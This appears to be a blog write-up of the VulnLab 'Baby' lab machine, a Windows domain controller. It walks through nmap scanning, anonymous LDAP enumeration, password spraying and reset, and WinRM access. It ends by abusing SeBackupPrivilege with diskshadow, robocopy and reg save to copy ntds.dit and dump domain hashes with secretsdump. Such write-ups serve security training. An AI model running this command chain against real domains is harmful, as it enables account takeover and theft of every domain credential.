---
layout: post
title: VulnLab - Baby
date: 15-04-2025
categories: [Machines]
tags: [ldap, anonymous, SeBackupPrivilege, smbpasswd]
image: "https://images-ext-1.discordapp.net/external/iTsNgpEcu1U88J1FvpyBi4VwhZZRBo0W6Rd5ARdznbE/https/assets.vulnlab.com/baby_slide.png?format=webp&quality=lossless"
---

## Scanning

```bash
➜  Baby nmap -Pn -T4 -sC -sV -p- 10.10.116.106 -oN reports/all_tcp.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-13 03:14 EAT
Nmap scan report for 10.10.116.106 (10.10.116.106)
Host is up (0.19s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-13 00:24:14Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-04-13T00:25:46+00:00; +4s from scanner time.
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2025-04-11T23:48:27
|_Not valid after:  2025-10-11T23:48:27
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-04-13T00:25:06+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
60933/tcp open  msrpc         Microsoft Windows RPC
60948/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3s, deviation: 0s, median: 3s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-13T00:25:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 670.17 seconds

```

## Enumeration

### LDAP

**Anonymous Access**

```bash
ldapsearch -x -H ldap://10.10.116.106 -b "DC=baby,DC=vl"
```

**Users**

```bash
ldapsearch -x -H ldap://10.10.116.106 -b "DC=baby,DC=vl" -D 'baby.vl' 'objectClass=user' | grep "sAMAccountName:" | cut -d' ' -f2 | tee loots/users.txt
```
![alt text](assets/image1.png)

Descriptions

```bash
ldapsearch -x -H ldap://10.10.116.106 -b "DC=baby,DC=vl" -D 'baby.vl' 'objectClass=user' | grep "description:"
```
![alt text](assets/image2.png)

### SMB

```bash
nxc smb 10.10.116.106 -u loots/users.txt -p 'BabyStart123!' --continue-on-success
```

![image](https://www.notion.so/image/attachment%3A8128a076-a6bb-4f80-9bb2-dc3ad0369069%3Aimage?table=block&id=1d43d2c4-89f6-80df-96ae-c13d0b80c19d&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)

Password Change

```bash
smbpasswd -r 10.10.116.106 -U Caroline.Robinson
```

![image](https://www.notion.so/image/attachment%3A05b5e0ca-390a-4177-93b8-e35d16df897c%3Aimage.png?table=block&id=1d43d2c4-89f6-809b-8d18-d1db8585fea6&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)

![image](https://www.notion.so/image/attachment%3Adb4dad91-4b41-4c20-9be5-ddcb4e2aac1d%3Aimage.png?table=block&id=1d43d2c4-89f6-800f-ac4c-f8e2119ddd37&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)

```bash
nxc smb 10.10.116.106 -u Caroline.Robinson -p 'NewSecurePass123!' --users
```

![image](https://www.notion.so/image/attachment%3A25f57ada-baf4-4c58-971b-ceec561bab1b%3Aimage.png?table=block&id=1d43d2c4-89f6-80b1-b9c3-e39f183bc325&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)

### Bloodhound

```bash
bloodhound-python -d baby.vl  -c all -u 'Caroline.Robinson' -p 'NewSecurePass123!'  -ns 10.10.116.106 --zip
```

![image](https://www.notion.so/image/attachment%3Aabb5435f-cbb9-4545-9e89-de1e97c36b6b%3Aimage.png?table=block&id=1d43d2c4-89f6-805b-afa4-ee34d032ccef&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)

First Degree Group Membership

![image](https://www.notion.so/image/attachment%3Ad0bf5e4e-f85b-4572-bf11-ea02f49caf53%3Aimage.png?table=block&id=1d43d2c4-89f6-806b-be52-c7f751f68f00&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)

## Initial Access

```bash
nxc winrm 10.10.116.106 -u Caroline.Robinson -p 'NewSecurePass123!'
```

![image](https://www.notion.so/image/attachment%3A6d9b5578-ff7b-4256-bc6e-5cba314f6c2a%3Aimage.png?table=block&id=1d43d2c4-89f6-8083-b950-da80549d037e&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)

```bash
evil-winrm -i 10.10.116.106 -u Caroline.Robinson -p 'NewSecurePass123!'
```

![image](https://www.notion.so/image/attachment%3A285aca5c-0905-44ce-a5f5-41b3c7d8c40a%3Aimage.png?table=block&id=1d43d2c4-89f6-80b4-8c0f-e784b08e0999&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)

## PrivEsc

![image](https://www.notion.so/image/attachment%3Af467d9ad-d930-45d5-8ce4-c89e693b6d2a%3Aimage.png?table=block&id=1d43d2c4-89f6-80b8-9502-dc58a986ac98&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)

vss.dsh

```bash
set context persistent nowriters
set metadata c:\programdata\cyb4x.cab
set verbose on
add volume c: alias cyb4x
create
expose %cyb4x% z:
```

![image](https://www.notion.so/image/attachment%3Af467d9ad-d930-45d5-8ce4-c89e693b6d2a%3Aimage.png?table=block&id=1d43d2c4-89f6-80b8-9502-dc58a986ac98&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)

```bash
diskshadow /s vss.dsh
```

![image](https://www.notion.so/image/attachment%3A9bae947d-2427-40a8-9a2d-257f5a30472c%3Aimage.png?table=block&id=1d43d2c4-89f6-8004-a822-cee10cea7040&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)

Copying

```bash
robocopy /b z:\windows\ntds . ntds.dit
```

![image](https://www.notion.so/image/attachment%3A9bae947d-2427-40a8-9a2d-257f5a30472c%3Aimage.png?table=block&id=1d43d2c4-89f6-8004-a822-cee10cea7040&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)

also

```bash
reg.exe save hklm\system system
```

download

![image](https://www.notion.so/image/attachment%3A8cc23693-5ecd-4051-83ed-689ac6d3bbb1%3Aimage.png?table=block&id=1d43d2c4-89f6-8046-a959-d847c4459f2f&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)

Dump secrets

```bash
secretsdump.py -system system -ntds ntds.dit local
```

![image](https://www.notion.so/image/attachment%3Ae5d49be1-1fef-495e-9b82-7569e4ed18e7%3Aimage.png?table=block&id=1d43d2c4-89f6-80f4-842a-d3321ab6e8a8&spaceId=5384ad7b-32cf-418d-869d-88e45a75b40a&width=2000&userId=0e6b7ce5-ad20-43e6-9208-1e3ee8ba82ae&cache=v2)